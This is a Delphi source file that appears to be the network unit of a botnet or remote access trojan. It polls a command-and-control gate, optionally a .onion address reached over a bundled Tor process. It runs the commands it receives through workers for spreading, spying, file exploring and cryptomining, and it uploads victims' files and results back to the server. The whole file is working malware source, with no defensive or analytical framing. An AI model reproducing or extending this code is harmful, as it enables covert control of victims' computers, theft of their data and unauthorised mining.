unit NetUnit;

{
  This unit handles network communication, command parsing,
  and other network-dependent tasks.
}

interface

uses
  System.SysUtils, System.Classes,
  Windows, ActiveX, Xml.xmldom, Xml.XMLIntf, Xml.XMLDoc, IdIOHandler,
  IdIOHandlerSocket, IdIOHandlerStack, IdSSL, IdSSLOpenSSL,
  IdCustomTransparentProxy, IdSocks, IdBaseComponent, IdComponent,
  IdTCPConnection, IdTCPClient, IdHTTP, IdMultiPartFormData,
  Basics, CommandUnit, SpreadUnit, InfoUnit, FileUnit, MineUnit;

type
  TNet = class(TDataModule)
    HTTPClient: TIdHTTP;
    TorInfo: TIdSocksInfo;
    IOHandler: TIdSSLIOHandlerSocketOpenSSL;
    XMLDoc: TXMLDocument;
    procedure DataModuleCreate(Sender: TObject);
    procedure DataModuleDestroy(Sender: TObject);
  private
    { Private declarations }
  public
    ///  <summary>Attempts to download a file from the given URL and save it as FileName</summary>
    function DownloadFile(URL, FileName: String): Boolean;
    ///  <summary>Downloads the list of commands from the server</summary>
    procedure GetCommands;
    ///  <summary>Parses the list of commands and assigns Workers to the new ones</summary>
    procedure ParseCommands;
    ///  <summary>Sends the response to a specific command as a TStringList</summary>
    ///  <param name="ID">Identifier of the given command</param>
    ///  <param name="Last">If true, the command will be marked as completed and deleted from the list</param>
    procedure SendResponse(R: TStringList; ID: Int64;
      Last: Boolean = True); overload;
    ///  <summary>Sends the response to a specific command as a simple String</summary>
    procedure SendResponse(S: String; ID: Int64; Last: Boolean = True);
      overload;
    ///  <summary>Uploads a file to the server as a response to a command</summary>
    procedure SendFile(FileName: String; ID: Int64);
    ///  <summary>Attempts to get the external IP Address</summary>
    function GetIP: String;
    procedure RunTor;
  end;

var
  Net: TNet;
  Allowed: Boolean;

const
  GATE_CMD = 'cmd';
  GATE_UPLOAD = 'upload';

implementation

{%CLASSGROUP 'System.Classes.TPersistent'}
{$R *.dfm}

function CreateWorker(ID: Int64; _Type: String; Params: TStringList): TWorker;
Begin
  if _Type = 'Spread' then
    Result := TSpreader.Create(ID, _Type, Params)
  else if _Type = 'Info' then
    Result := TSpy.Create(ID, _Type, Params)
  else if _Type = 'File' then
    Result := TExplorer.Create(ID, _Type, Params)
  else if _Type = 'Mine' then
    Result := TMiner.Create(ID, _Type, Params)

  else
    Result := TWorker.Create(ID, _Type, Params);
End;

function StringListToFormData(R: TStringList): TIdMultiPartFormDataStream;
var
  I: LongInt;
Begin
  Result := TIdMultiPartFormDataStream.Create;
  for I := 0 to R.Count - 1 do
    Result.AddFormField(R.Names[I], R.ValueFromIndex[I]);
End;

function TNet.DownloadFile(URL: string; FileName: string): Boolean;
var
  M: TMemoryStream;
begin
  Result := True;
  M := TMemoryStream.Create;
  try
    try
      TThread.Synchronize(Nil,
        procedure
        Begin
          HTTPClient.Get(URL, M);
        End);
      M.Position := 0;
      M.SaveToFile(FileName);
    except
      on E: Exception do
      Begin
        Result := False;
        Dbg('DownloadFile Error ' + E.ClassName + ': ' + E.Message, dError);
      end;
    end;
  finally
    M.Free;
  end;
end;

procedure TNet.SendResponse(R: TStringList; ID: Int64; Last: Boolean = True);
var
  S: String;
  M: TIdMultiPartFormDataStream;
begin
  R.Insert(0, 'CommandID=' + IntToStr(ID));
  R.AddPair('Last', BoolToStr(Last, True));
  M := StringListToFormData(R);
  try
    S := Options.Gate + GATE_CMD;
    TThread.Synchronize(Nil,
      procedure
      Begin
        HTTPClient.Post(S, M);
      End);
  except
    on E: Exception do
      Dbg('SendMsg Error ' + E.ClassName + ': ' + E.Message, dError);
  end;
  M.Free;
end;

procedure TNet.SendResponse(S: string; ID: Int64; Last: Boolean = True);
var
  R: TStringList;
begin
  R := TStringList.Create;
  R.AddPair('Result', S);
  SendResponse(R, ID, Last);
  R.Free;
end;

procedure TNet.SendFile(FileName: String; ID: Int64);
var
  R: TIdMultiPartFormDataStream;
  S: String;
begin
  if Not(FileExists(FileName)) then
    Exit;
  R := TIdMultiPartFormDataStream.Create;
  try
    R.AddFile('file', FileName);
    R.AddFormField('CommandID', IntToStr(ID));
    R.AddFormField('Name', Options.Name);
    TThread.Synchronize(Nil,
      procedure
      Begin
        S := HTTPClient.Post(Options.Gate + GATE_UPLOAD, R);
      End);
  except
    on E: Exception do
      Dbg('SendFile Error ' + E.ClassName + ': ' + E.Message, dError);
  end;
  R.Free;
  SendResponse('File upload complete.', ID);
end;

procedure TNet.ParseCommands;
var
  Root, Node: IXMLNode;
  I, J: Integer;

  ID: Int64;
  W: TWorker;
  A: TStringList;
begin
  try
    XMLDoc.Active := True;
    try
      Root := XMLDoc.DocumentElement;
      if Assigned(Root) then
        for I := 0 to Root.ChildNodes.Count - 1 do
        Begin
          Node := Root.ChildNodes[I];
          ID := Node.Attributes['id'];
          if Not(IsRunning(ID)) then
          Begin
            Dbg('New command: ' + Node.Attributes['type']);
            A := TStringList.Create;
            for J := 0 to Node.ChildNodes.Count - 1 do
              A.AddPair(Node.ChildNodes.Nodes[J].NodeName,
                Node.ChildNodes.Nodes[J].NodeValue);
            if Node.Attributes['type'] = 'Abort' then
              AbortCommand(A, ID)
            else
            Begin
              W := CreateWorker(ID, Node.Attributes['type'], A);
              Workers.Add(W);
            End;
          End;
        End;
    except
      on E: Exception do
        Dbg('Parse Error ' + E.ClassName + ': ' + E.Message, dError);
    end;
  finally
    XMLDoc.Xml.Text := '';
    XMLDoc.Active := False;
  end;
end;

procedure TNet.GetCommands;
var
  S: String;
Begin
  if Not(Allowed) then
    Exit;
  try
    S := HTTPClient.Get(Options.Gate + GATE_CMD);
    XMLDoc.Xml.Text := S;
  except
    on E: Exception do
      Dbg('GetError ' + E.ClassName + ': ' + E.Message, dWarn);
  end;
End;

function TNet.GetIP: String;
var
  S, A: Boolean;
  C: Byte; // Number of retries
begin
  C := 0;
  Repeat
    S := True;
    Inc(C);
    A := IOHandler.TransparentProxy = TorInfo;
    IOHandler.TransparentProxy := Nil;
    try
      Result := HTTPClient.Get('https://api.ipify.org');
    except
      S := False;
      Dbg('Attempt #' + IntToStr(C) + ': failed to get IP.', dWarn);
    end;
    if A then
      IOHandler.TransparentProxy := TorInfo;
  Until (C = 2) or S;
  if Not(S) then
    Result := '127.0.0.1';
  Dbg('IP Address: ' + Result);
end;

procedure TNet.RunTor;
begin
  Execute('Tor\tor.exe', []);
  Sleep(7000);
end;

procedure TNet.DataModuleCreate(Sender: TObject);
begin
  CoInitialize(Nil); // For XML (ComObject) operations
  HTTPClient.Request.CustomHeaders.AddValue('User', Options.GUID);
  HTTPClient.Request.CustomHeaders.AddValue('Name', Options.Name);
  Allowed := True;
  if DirectoryExists('Tor') then
    SetDLLDirectory(PWideChar(Options.BaseDir + '\Tor'));
  if (Options.Tor) and (Pos('.onion', Options.Gate) > 0) then
  Begin
    IOHandler.TransparentProxy := TorInfo;
    RunTor;
  End;
end;

procedure TNet.DataModuleDestroy(Sender: TObject);
begin
  CoUninitialize;
end;

end.
